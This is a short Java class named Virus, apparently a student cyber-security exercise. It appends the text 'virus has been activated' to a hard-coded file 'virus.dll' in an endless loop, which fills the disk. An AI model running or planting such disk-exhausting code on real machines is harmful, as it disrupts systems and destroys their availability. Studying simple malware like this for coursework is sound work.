/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package practical5;
import java.io.*;
/**
 *
 * @author dell
 */
public class Virus {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) 
    {
        try
        {
            FileWriter fw=new FileWriter("F:\\Msc Docs\\MSC-2\\Practical\\Cyber\\virus.dll",true);
            while(true)
            {
                fw.write("virus has been activated");
            }
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
    }
    
}
